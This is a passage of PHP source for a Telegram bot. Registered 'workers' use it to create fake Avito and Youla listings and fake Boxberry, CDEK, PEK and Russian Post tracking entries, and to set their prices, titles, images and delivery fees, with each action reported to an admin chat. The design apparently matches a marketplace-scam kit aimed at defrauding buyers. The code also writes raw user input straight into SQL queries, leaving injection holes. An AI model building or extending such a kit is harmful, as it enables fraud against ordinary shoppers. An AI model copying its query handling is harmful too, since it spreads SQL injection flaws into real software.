								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["5"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['product'])) {
							if(mb_strlen($message['text']) <= 50) {
								mysqli_query($connection, "UPDATE `trackcodespost` SET `product` = '$message[text]' WHERE `id` = '$track[id]'");
								
								$text = $bot_chat["create_track"]["asks"]["pochta"]["7"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["6"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['amount'])) {
							if(preg_match('/^[0-9]{2,5}$/i', $message['text']) == TRUE) {
								if($message['text'] >= $settings['min_price'] AND $message['text'] <= $settings['max_price']) {

									mysqli_query($connection, "UPDATE `trackcodespost` SET `amount` = '$message[text]' WHERE `id` = '$track[id]'");
									$text = $bot_chat["create_track"]["asks"]["pochta"]["8"];
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = sprintf($bot_chat["create_track"]["errors"]["pochta"]["7"], $settings['min_price'], $settings['max_price']);
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = sprintf($bot_chat["create_track"]["errors"]["pochta"]["7"], $settings['min_price'], $settings['max_price']);
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['weight'])){
							if(mb_strlen($message['text']) <= 250 AND mb_strlen($message['text']) >= 1) {

								mysqli_query($connection, "UPDATE `trackcodespost` SET `weight` = '$message[text]' WHERE `id` = '$track[id]'");
								$text = $bot_chat["create_track"]["asks"]["pochta"]["9"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["8"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(empty($track['index_to'])){
							if(($message['text'] >= 100000 AND mb_strlen($message['text']) <= 999999)) {

								mysqli_query($connection, "UPDATE `trackcodespost` SET `index_to` = '$message[text]', `status` = '1' WHERE `id` = '$track[id]'");

								$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_u'], $track['code'], $track['product'], $track['amount']));

								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['pochta'].'/track/'.$track['code'])))));
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								
								$text = str_replace("\t", "", sprintf($bot_chat['create_track']['template_track_a'], $message['from'], $message['firstname'], $message['lastname'], $track['code'], $track['product'], $track['amount']));

								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['create_track']['url_button'], 'url' => $links['pochta'].'/track/'.$track['code'])))));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							} else {
								$text = $bot_chat["create_track"]["errors"]["pochta"]["9"];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					} else {
						$text = $bot_chat['create_track']['messages']['help'];
					}
					
					if($message['text'] == '/help') {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => showCommands(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => showCommands(1)));
					}
					
					if(preg_match('/\/hide/i', $message['text']) == TRUE) {
						if(preg_match('/\/hide \d+/i', $message['text']) == TRUE) {
							$advert_id = mb_substr($message['text'], 6);
							
							$query = mysqli_query($connection, "SELECT `worker` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` > '0' AND `worker` = '$message[from]'");
							
							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);
								
								if($advert['worker'] == $message['from']) {
									mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id' AND `worker` = '$message[from]'");
									
									$text = sprintf($bot_chat['hide']['header'], $advert_id);
									$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => $bot_chat['hide']['keyboard']['recovery'], 'callback_data' => '/show/'.$advert_id.'/')))));
									
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
									$text = sprintf($bot_chat['hide']['header'], $message['from'], $advert_id);
									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								} else {
									$text = $bot_chat['hide']['errors']['invalid_user'];
									send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								}
							} else {
								$text = $bot_chat['hide']['errors']['not_exists'];
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} else {
							$text = $bot_chat['hide']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/setimage/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setimage ([a-z0-9]{24}|\d+);.+$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));
							
							if(preg_match('/(http|https):\/\/cache\d.youla.io\/files\/images\/.+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/\d{1,3}.img.avito.st\/\d{3,4}x\d{3,4}\/\d+.jpg/i', $edit[1]) == TRUE OR preg_match('/(http|https):\/\/i.imgur.com\/.+.jpg/i', $edit[1]) == TRUE) {
								$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
								
								if(mysqli_num_rows($query) > 0) {
									$advert = mysqli_fetch_assoc($query);
									
									if($advert['worker'] == $message['from']) {
										if($advert['status'] > 1) {
											mysqli_query($connection, "UPDATE `adverts` SET `image` = '$edit[1]' WHERE `advert_id` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");

											$text = sprintf($bot_chat['setimage']['header'], $message['from'], $message['firstname'], $message['lastname']);
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											$text = $bot_chat['setimage']['messages']['success'];
										} else {
											$text = $bot_chat['setimage']['messages']['waiting'];
										}
									} else {
										$text = $bot_chat['setimage']['errors']['invalid_user'];
									}
								} else {
									$text = $bot_chat['setimage']['errors']['not_exists'];
								}
							} else {
								$text = $bot_chat['setimage']['errors']['wrong_link'];
							}
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));					
						} else {
							$text = $bot_chat['setimage']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/setdelivery/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setdelivery ([a-z0-9]{24}|\d+);[0-9]{3,5}$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 13));
							
							$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]' AND `worker` = '$message[from]'");
							
							if(mysqli_num_rows($query) > 0) {
								$advert = mysqli_fetch_assoc($query);
								
								if($advert['worker'] == $message['from']) {
									mysqli_query($connection, "UPDATE `adverts` SET `delivery` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
									
									$text = sprintf($bot_chat['setdelivery']['header'], $message['from'], $message['firstname'], $message['lastname'], $edit[1]);

									send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
									$text = sprintf($bot_chat['setdelivery']['messages']['success'], $edit[1]);
									
									if($advert['type'] == 0) {
										$text .= sprintf($bot_chat['setdelivery']['template'], $links['avito'], $edit[0]);
									} elseif($advert['type'] == 1) {
										$text .= sprintf($bot_chat['setdelivery']['template'], $links['youla'], $edit[0]);
									}
								} else {
									$text = $bot_chat['setdelivery']['errors']['invalid_user'];
								}
							} else {
								$text = $bot_chat['setdelivery']['errors']['not_exists'];
							}
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $bot_chat['setdelivery']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/setprice/i', $message['text']) == TRUE) {
						if(preg_match('/^\/setprice ([0-9]+|[a-z0-9]{24});\d{3,6}$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));
							
							if($edit[1] >= $settings['min_price'] AND $edit[1] <= $settings['max_price']) {
								$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
								$trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");
								$strackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodessdek` WHERE `code` = '$edit[0]'");
								$ptrackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodespek` WHERE `code` = '$edit[0]'");
								$pstrackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodespost` WHERE `code` = '$edit[0]'");
								
								if(mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0 OR mysqli_num_rows($strackcodes) > 0 OR mysqli_num_rows($ptrackcodes) > 0 OR mysqli_num_rows($pstrackcodes) > 0) {
									if(mysqli_num_rows($adverts) > 0) {
										$advert = mysqli_fetch_assoc($adverts);
										
										if($advert['worker'] == $message['from']) {
											mysqli_query($connection, "UPDATE `adverts` SET `price` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
											
											$text = sprintf($bot_chat['setprice']['header_a'], $message['from'], $message['firstname'], $message['lastname'], $advert['price'], $edit[1]);

											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

											$text = sprintf($bot_chat['setprice']['messages']['advert']['success'], $advert['price'], $edit[1]);
											
											if($advert['type'] == 0) {
												$text .= sprintf($bot_chat['setprice']['template_a'], $links['avito'], $edit[0]);
											} elseif($advert['type'] == 1) {
												$text .= sprintf($bot_chat['setprice']['template_a'], $links['youla'], $edit[0]);
											}
										} else {
											$text = $bot_chat['setprice']['errors']['advert']['invalid_user'];
										}
									} elseif(mysqli_num_rows($trackcodes) > 0) {
										$track = mysqli_fetch_assoc($trackcodes);
										
										if($track['worker'] == $message['from']) {
											if($track['status'] > 0) {
												mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
												
												$text = sprintf($bot_chat['setprice']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $track['amount'], $edit[1]);
												send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
												$text = sprintf($bot_chat['setprice']['messages']['track']['success'], $track['amount'], $edit[1]);

												$text .= sprintf($bot_chat['setprice']['template_t'], $links['boxberry'], $track['code']);
											} else {
												$text = $bot_chat['setprice']['errors']['track']['not_exists'];
											}
										} else {
											$text = $bot_chat['setprice']['errors']['track']['invalid_user'];
										}
									} elseif(mysqli_num_rows($strackcodes) > 0) {
										$track = mysqli_fetch_assoc($strackcodes);
										
										if($track['worker'] == $message['from']) {
											if($track['status'] > 0) {
												mysqli_query($connection, "UPDATE `trackcodessdek` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
												
												$text = sprintf($bot_chat['setprice']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $track['amount'], $edit[1]);
												send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
												$text = sprintf($bot_chat['setprice']['messages']['track']['success'], $track['amount'], $edit[1]);

												$text .= sprintf($bot_chat['setprice']['template_t'], $links['cdek'], $track['code']);
											} else {
												$text = $bot_chat['setprice']['errors']['track']['not_exists'];
											}
										} else {
											$text = $bot_chat['setprice']['errors']['track']['invalid_user'];
										}
									} elseif(mysqli_num_rows($ptrackcodes) > 0) {
										$track = mysqli_fetch_assoc($ptrackcodes);
										
										if($track['worker'] == $message['from']) {
											if($track['status'] > 0) {
												mysqli_query($connection, "UPDATE `trackcodespek` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
												
												$text = sprintf($bot_chat['setprice']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $track['amount'], $edit[1]);
												send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
												$text = sprintf($bot_chat['setprice']['messages']['track']['success'], $track['amount'], $edit[1]);

												$text .= sprintf($bot_chat['setprice']['template_t'], $links['pek'], $track['code']);
											} else {
												$text = $bot_chat['setprice']['errors']['track']['not_exists'];
											}
										} else {
											$text = $bot_chat['setprice']['errors']['track']['invalid_user'];
										}
									} elseif(mysqli_num_rows($pstrackcodes) > 0) {
										$track = mysqli_fetch_assoc($pstrackcodes);
										
										if($track['worker'] == $message['from']) {
											if($track['status'] > 0) {
												mysqli_query($connection, "UPDATE `trackcodespost` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
												
												$text = sprintf($bot_chat['setprice']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $track['amount'], $edit[1]);
												send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
												$text = sprintf($bot_chat['setprice']['messages']['track']['success'], $track['amount'], $edit[1]);

												$text .= sprintf($bot_chat['setprice']['template_t'], $links['pochta'], $track['code']);
											} else {
												$text = $bot_chat['setprice']['errors']['track']['not_exists'];
											}
										} else {
											$text = $bot_chat['setprice']['errors']['track']['invalid_user'];
										}
									}
								} else {
									$text = $bot_chat['setprice']['errors']['not_exists'];
								}
							} else {
								$text = sprintf($bot_chat['setprice']['errors']['invalid_price'], $settings['max_price'], $settings['min_price']);
							}
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $bot_chat['setprice']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if(preg_match('/^\/settitle/i', $message['text']) == TRUE) {
						if(preg_match('/^\/settitle (.{24}|\d+);.+$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));
							
							$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
							$trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");
							$strackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodessdek` WHERE `code` = '$edit[0]'");
							$ptrackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodespek` WHERE `code` = '$edit[0]'");
							$pstrackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodespost` WHERE `code` = '$edit[0]'");
							
							if(mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0 OR mysqli_num_rows($strackcodes) > 0 OR mysqli_num_rows($ptrackcodes) > 0 OR mysqli_num_rows($pstrackcodes) > 0) {
								if(mysqli_num_rows($adverts) > 0) {
									$advert = mysqli_fetch_assoc($adverts);
									
									if($advert['worker'] == $message['from']) {
										mysqli_query($connection, "UPDATE `adverts` SET `title` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
										$text = sprintf($bot_chat['settitle']['header_a'], $message['from'], $message['firstname'], $message['lastname']);
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										$text = $bot_chat['settitle']['messages']['advert']['success'];
										
										if($advert['type'] == 0) {
											$text .= sprintf($bot_chat['settitle']['template_a'], $links['avito'], $edit[0]);
										} elseif($advert['type'] == 1) {
											$text .= sprintf($bot_chat['settitle']['template_a'], $links['youla'], $edit[0]);
										}
									} else {
										$text = $bot_chat['settitle']['errors']['advert']['invalid_user'];
									}
								} elseif(mysqli_num_rows($trackcodes) > 0) {
									$track = mysqli_fetch_assoc($trackcodes);
									
									if($track['worker'] == $message['from']) {
										if($track['status'] > 0) {
											mysqli_query($connection, "UPDATE `trackcodes` SET `product` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
											
											$text = sprintf($bot_chat['settitle']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $edit[1]);
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											$text = sprintf($bot_chat['settitle']['messages']['track']['success'], $edit[1]);

											$text .= sprintf($bot_chat['settitle']['template_t'], $links['boxberry'], $track['code']);
										} else {
											$text = $bot_chat['settitle']['errors']['track']['not_exists'];
										}
									} else {
										$text = $bot_chat['settitle']['errors']['track']['invalid_user'];
									}
								} elseif(mysqli_num_rows($strackcodes) > 0) {
									$track = mysqli_fetch_assoc($strackcodes);
									
									if($track['worker'] == $message['from']) {
										if($track['status'] > 0) {
											mysqli_query($connection, "UPDATE `trackcodessdek` SET `product` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
										
											$text = sprintf($bot_chat['settitle']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $edit[1]);
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											$text = sprintf($bot_chat['settitle']['messages']['track']['success'], $edit[1]);
										} else {
											$text = $bot_chat['settitle']['errors']['track']['not_exists'];
										}
									} else {
										$text = $bot_chat['settitle']['errors']['track']['invalid_user'];
									}
								} elseif(mysqli_num_rows($ptrackcodes) > 0) {
									$track = mysqli_fetch_assoc($ptrackcodes);
									
									if($track['worker'] == $message['from']) {
										if($track['status'] > 0) {
											mysqli_query($connection, "UPDATE `trackcodespek` SET `product` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
										
											$text = sprintf($bot_chat['settitle']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $edit[1]);
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											$text = sprintf($bot_chat['settitle']['messages']['track']['success'], $edit[1]);
										} else {
											$text = $bot_chat['settitle']['errors']['track']['not_exists'];
										}
									} else {
										$text = $bot_chat['settitle']['errors']['track']['invalid_user'];
									}
								} elseif(mysqli_num_rows($pstrackcodes) > 0) {
									$track = mysqli_fetch_assoc($pstrackcodes);
									
									if($track['worker'] == $message['from']) {
										if($track['status'] > 0) {
											mysqli_query($connection, "UPDATE `trackcodespost` SET `product` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
										
											$text = sprintf($bot_chat['settitle']['header_t'], $message['from'], $message['firstname'], $message['lastname'], $edit[1]);
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											$text = sprintf($bot_chat['settitle']['messages']['track']['success'], $edit[1]);
										} else {
											$text = $bot_chat['settitle']['errors']['track']['not_exists'];
										}
									} else {
										$text = $bot_chat['settitle']['errors']['track']['invalid_user'];
									}
								} 
							} else {
								$text = $bot_chat['settitle']['errors']['not_exists'];
							}
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = $bot_chat['settitle']['messages']['help'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if(preg_match('/\/start/i', $message['text']) == TRUE OR $message['text'] == $keyboards['back_button'][0][0] OR preg_match('/^\/info$/i', $message['text']) == TRUE) {
						mysqli_query($connection, "UPDATE `trackcodespek` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						mysqli_query($connection, "UPDATE `trackcodespost` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						mysqli_query($connection, "UPDATE `trackcodessdek` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						mysqli_query($connection, "UPDATE `sendmails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						if($user['access'] >= 666){
							$keyboard = $adminKeyboard;
						}else{
							$keyboard = $defaultKeyboard;
						}
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
					}
					
					if($message['text'] == $main_keyboard_user[0][0]) {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyProfile($message['from'], 0, 1)));
					}
					
					if($message['text'] == $main_keyboard_user[0][1]) {
						$link = "/getadverts/$message[from]";
						$user_id = $message['from'];
						$avito = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `adverts` WHERE `worker` = '$user_id' AND `type` = '0' AND `status` > '0'"));
						$youla = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `adverts` WHERE `worker` = '$user_id' AND `type` = '1' AND `status` > '0'"));
		                $boxberry = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'"));
		                $cdek = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodessdek` WHERE `worker` = '$user_id' AND `status` > '0'"));
		                $post = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodespost` WHERE `worker` = '$user_id' AND `status` > '0'"));
		                $pek = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `trackcodespek` WHERE `worker` = '$user_id' AND `status` > '0'"));
						$keyboard = Array('inline_keyboard' => Array(
							Array(
								Array('text' => sprintf($keyboards['myadverts'][0][0], $avito['count']), 'callback_data' => $link.'/AVT'), 
								Array('text' => sprintf($keyboards['myadverts'][0][1], $youla['count']), 'callback_data' => $link.'/YOU')
							), 
							Array(
								Array('text' => sprintf($keyboards['myadverts'][1][0], $boxberry['count']), 'callback_data' => $link.'/BOX'), 
								Array('text' => sprintf($keyboards['myadverts'][1][1], $cdek['count']), 'callback_data' => $link.'/SDK')
							), 
							Array(
								Array('text' => sprintf($keyboards['myadverts'][2][0], $pek['count']), 'callback_data' => $link.'/PEK'), 
								Array('text' => sprintf($keyboards['myadverts'][2][1], $post['count']), 'callback_data' => $link.'/PST')
							)));
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $bot_chat['myadverts']['header'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
					}
					
					if($message['text'] == $main_keyboard_user[2][1]) {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => showHelp(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => showHelp(1)));
					}
					
					if($message['text'] == $main_keyboard_user[2][0]) {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => showAbout(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => showAbout(1)));
					}
					
					if($message['text'] == $keyboards['create_link'][0][0] OR $message['text'] == $keyboards['create_link'][0][1]) {
						$search = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '0'");
						
						if(mysqli_num_rows($search) > 0) {
							$text = $bot_chat['create_advert']['messages']['waiting'];
						} else {
							if($message['text'] == $keyboards['create_link'][0][0]) $type = '0';
							if($message['text'] == $keyboards['create_link'][0][1]) $type = '1';
							
							mysqli_query($connection, "INSERT INTO `adverts` (`type`, `advert_id`, `worker`, `price`, `delivery`, `views`, `status`, `time`) VALUES ('$type', '".rand(10000000000, 99999999999)."', '$message[from]', '0', '-1', '0', '0', '".time()."')");
						
							$text = $bot_chat['create_advert']['asks']['1'];
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if($message['text'] == $main_keyboard_user[1][0]) {
					    
					    $text = str_replace("\t", "", $bot_chat['create_link']['header']);
						
						$keyboard = json_encode(Array('keyboard' => $keyboards['create_link'], 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
						
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
					}
				
					if($message['text'] == $keyboards['create_link'][1][0]) {
						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = $bot_chat["create_track"]["messages"]["waiting"];
						} else {
							mysqli_query($connection, "INSERT INTO `trackcodes` (`code`, `worker`, `status`, `time`) VALUES ('".rand(1000000, 99999999)."', '$message[from]', '0', '".time()."')");
							$text = $bot_chat["create_track"]["asks"]["boxberry"]["1"];
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
					
					if($message['text'] == $keyboards['create_link'][1][1]) {
						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodessdek` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = $bot_chat["create_track"]["messages"]["waiting"];
						} else {
							mysqli_query($connection, "INSERT INTO `trackcodessdek` (`code`, `worker`, `status`, `time`) VALUES ('".rand(1000000, 999999999999)."', '$message[from]', '0', '".time()."')");
							$text = $bot_chat["create_track"]["asks"]["cdek"]["1"];
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if($message['text'] == $keyboards['create_link'][2][0]) {
						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodespek` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = $bot_chat["create_track"]["messages"]["waiting"];
						} else {
							mysqli_query($connection, "INSERT INTO `trackcodespek` (`code`, `worker`, `status`, `time`) VALUES ('".rand(1000000, 999999999999)."', '$message[from]', '0', '".time()."')");
							$text = $bot_chat["create_track"]["asks"]["pek"]["1"];
							
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if($message['text'] == $keyboards['create_link'][2][1]) {
